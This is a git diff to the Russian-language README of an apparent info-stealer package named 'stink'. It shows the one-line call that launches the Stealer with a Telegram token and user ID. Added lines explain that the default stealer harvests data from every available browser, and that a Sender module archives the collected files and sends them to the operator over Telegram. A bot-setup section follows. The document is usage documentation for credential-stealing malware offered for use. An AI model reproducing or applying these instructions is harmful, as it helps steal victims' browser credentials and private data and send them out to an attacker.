@@ -40,6 +40,8 @@ from stink.multistealer import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
+Стандартный ```Stealer``` запускает сбор по всем доступным браузерам.
+
 ### Кастомный
 ```python
 from os import path, mkdir
@@ -67,6 +69,8 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+В кастомном стиллере нужно самому прописывать путь для хранения собранных данных. Модуль ```Sender``` запакует все файлы из прописанного пути в архив и отправит его вам в Telegram.
+
 ## Настройка Telegram бота
 ### Получение токена
 1. Открываем чат с [BotFather](https://t.me/botfather).
